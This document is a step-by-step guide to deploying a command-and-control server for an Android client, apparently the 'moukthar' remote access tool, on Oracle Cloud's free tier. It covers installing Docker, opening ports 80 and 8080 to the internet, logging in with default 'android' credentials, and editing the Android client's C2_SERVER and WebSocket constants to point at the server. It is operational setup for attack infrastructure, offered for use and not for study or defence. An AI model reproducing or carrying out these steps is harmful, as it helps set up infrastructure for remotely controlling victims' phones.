# Oracle Cloud Always Free Deployment

## Overview

Oracle Cloud offers a **truly free forever** tier that's perfect for this C2 server:
- Always-on compute instance (ARM-based)
- 20GB storage
- Free MySQL database option
- No time limit
- No credit card charges (if you stay within free tier)

**Cost: $0/month (forever)**

---

## Prerequisites

- Oracle Cloud account (free)
- SSH client (built-in on Mac/Linux, PuTTY on Windows)
- GitHub account with your moukthar repository

---

## Step 1: Create Oracle Cloud Account

1. Go to [oracle.com/cloud/free](https://oracle.com/cloud/free)
2. Click **Sign Up**
3. Create account (requires email and phone verification)
4. Login to Oracle Cloud Console

---

## Step 2: Create Compute Instance

### In Oracle Cloud Console:

1. **Navigate to Compute**
   - Menu → Compute → Instances

2. **Create Instance**
   - Click "Create Instance"
   - **Name:** moukthar-c2
   - **Image and Shape:**
     - Image: Canonical Ubuntu 22.04 (ARM)
     - Shape: Ampere (ARM processor) - Always Free eligible
     - Ensure it says "Always Free Eligible" ✓

3. **Networking**
   - Select your VCN (Virtual Cloud Network)
   - Assign public IPv4 address ✓

4. **Add Storage**
   - Root volume: 50GB (free tier allows this)

5. **SSH Key**
   - Download your SSH private key
   - **Important:** Save this file securely! (e.g., `oracle-key.pem`)
   - You'll need it to access the instance

6. **Create Instance**
   - Click "Create"
   - Wait 2-3 minutes for it to start

### Get Your Instance IP

1. Go to Compute → Instances
2. Click on your instance (moukthar-c2)
3. Copy the **Public IP Address**

---

## Step 3: Connect via SSH

### On Mac/Linux:

```bash
# Set permissions on key
chmod 600 /path/to/oracle-key.pem

# Connect to instance
ssh -i /path/to/oracle-key.pem ubuntu@YOUR_INSTANCE_IP
```

### On Windows (with PuTTY):

1. Convert .pem key to .ppk (PuTTYgen)
2. Open PuTTY
3. Session → Host: `ubuntu@YOUR_INSTANCE_IP`
4. Connection → SSH → Auth → Private key file: Your .ppk file
5. Click Open

---

## Step 4: Install Docker

Once connected to your instance:

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Add current user to docker group
sudo usermod -aG docker ubuntu

# Exit and reconnect to apply group changes
exit
```

Reconnect via SSH, then verify:
```bash
docker --version
docker run hello-world
```

---

## Step 5: Install Docker Compose

```bash
# Download Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose

# Make it executable
sudo chmod +x /usr/local/bin/docker-compose

# Verify
docker-compose --version
```

---

## Step 6: Clone Repository

```bash
# Install git
sudo apt install -y git

# Clone your repository
git clone https://github.com/YOUR_USERNAME/moukthar.git
cd moukthar/Server
```

---

## Step 7: Configure for Remote Access

Update the WebSocket URI for your instance:

```bash
# Edit docker-compose.yml
nano docker-compose.yml
```

Change this line:
```yaml
WEBSOCKET_URI: 'ws://localhost:8080'
```

To:
```yaml
WEBSOCKET_URI: 'ws://YOUR_INSTANCE_IP:8080'
```

Save: `Ctrl+X` → `Y` → `Enter`

---

## Step 8: Configure Firewall

Oracle Cloud has strict firewall rules. You need to open ports 80 and 8080:

### In Oracle Cloud Console:

1. Go to Compute → Instances
2. Click your instance
3. **Virtual Cloud Network** → Click VCN name
4. **Security Lists** → Default security list
5. **Ingress Rules** → Add Ingress Rule

**Add Two Rules:**

**Rule 1 (HTTP):**
- Stateless: Unchecked
- Source Type: CIDR
- Source CIDR: `0.0.0.0/0`
- IP Protocol: TCP
- Source Port Range: All
- Destination Port Range: `80`
- Description: "HTTP"

**Rule 2 (WebSocket):**
- Stateless: Unchecked
- Source Type: CIDR
- Source CIDR: `0.0.0.0/0`
- IP Protocol: TCP
- Source Port Range: All
- Destination Port Range: `8080`
- Description: "WebSocket"

---

## Step 9: Start Docker Services

On the instance:

```bash
# Navigate to Server directory
cd moukthar/Server

# Build and start all services
docker-compose up -d --build

# Check status
docker-compose ps
```

Wait 1-2 minutes for MySQL to initialize.

Check logs:
```bash
docker-compose logs mysql    # Wait for "ready for connections"
docker-compose logs php-apache
docker-compose logs websocket
```

---

## Step 10: Access Your C2 Server

Open browser and go to:
```
http://YOUR_INSTANCE_IP
```

Login with:
- **Username:** android
- **Password:** android

---

## Configure Android Client

Update the client code to point to your server:

**File:** `Client/app/src/main/java/com/ot/grhq/client/functionality/Utils.java`

Change:
```java
private static final String C2_SERVER = "http://localhost";
public static final String WEB_SOCKET_SERVER = "ws://localhost:8080";
```

To:
```java
private static final String C2_SERVER = "http://YOUR_INSTANCE_IP";
public static final String WEB_SOCKET_SERVER = "ws://YOUR_INSTANCE_IP:8080";
```

---

## Monitoring and Maintenance

### Check Logs

```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f php-apache
docker-compose logs -f mysql
docker-compose logs -f websocket
```

### Check Disk Space

```bash
df -h
```

If low on space, increase your volume in Oracle Cloud Console.

### Restart Services

```bash
# All services
docker-compose restart

# Specific service
docker-compose restart php-apache
```

### Update Code

```bash
# Pull latest changes
git pull

# Rebuild containers
docker-compose down
docker-compose up -d --build
```

---

## Important Notes

### Free Tier Limits

Stay within free tier limits:
- ✅ 2 OCPU (processor cores)
- ✅ 12GB RAM
- ✅ 50GB storage per instance
- ✅ Always-free eligible compute shape
- ✅ Data egress: 10GB/month free, then small charges

### Preventing Charges

To avoid unexpected charges:

1. **Only use Always Free eligible shapes**
   - Instance type shows "Always Free Eligible" ✓

2. **Monitor your usage**
   - Billing → Cost analysis

3. **Set up billing alerts**
   - Billing → Budgets
   - Set limit to $1/month

4. **Use only free resources**
   - Don't create load balancers
   - Don't use database beyond free tier

### Keeping Instance Secure

```bash
# Disable password login (use SSH keys only)
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# Enable firewall
sudo ufw enable
sudo ufw allow 22/tcp  # SSH
sudo ufw allow 80/tcp  # HTTP
sudo ufw allow 8080/tcp # WebSocket

# Keep system updated
sudo apt update && sudo apt upgrade -y
```

---

## Troubleshooting

### Can't SSH into instance

1. Check public IP is assigned
2. Verify security group allows port 22
3. Check SSH key permissions: `chmod 600 key.pem`
4. Try: `ssh -i key.pem -v ubuntu@IP` (verbose mode)

### Ports not accessible

1. Check firewall rules in Oracle Console
2. Verify `docker-compose ps` shows containers running
3. Check `docker-compose logs` for errors
4. Try from instance: `curl http://localhost:80`

### MySQL won't start

1. Check logs: `docker-compose logs mysql`
2. May need 30-60 seconds to initialize
3. Restart: `docker-compose restart mysql`
4. Verify disk space: `df -h`

### WebSocket connection fails

1. Verify WebSocket container: `docker-compose ps websocket`
2. Check logs: `docker-compose logs websocket`
3. Verify firewall allows port 8080
4. Try: `curl http://YOUR_IP:8080`

---

## Cost Verification

To confirm you're on free tier:

1. Go to Oracle Cloud Console
2. **Billing → Cost Analysis**
3. Should show $0.00 or minimal cost

If showing unexpected charges:
1. Stop all containers: `docker-compose down`
2. Check which resources are charged
3. Delete non-free tier resources

---

## Next Steps

1. ✅ Instance created and configured
2. ✅ Docker services running
3. ✅ Server accessible at http://YOUR_IP
4. 🔄 Configure Android client
5. 🔄 Test connectivity

For questions, check [FREE_HOSTING_OPTIONS.md](FREE_HOSTING_OPTIONS.md) for other options.

---

**You now have a free, always-on C2 server running forever!**
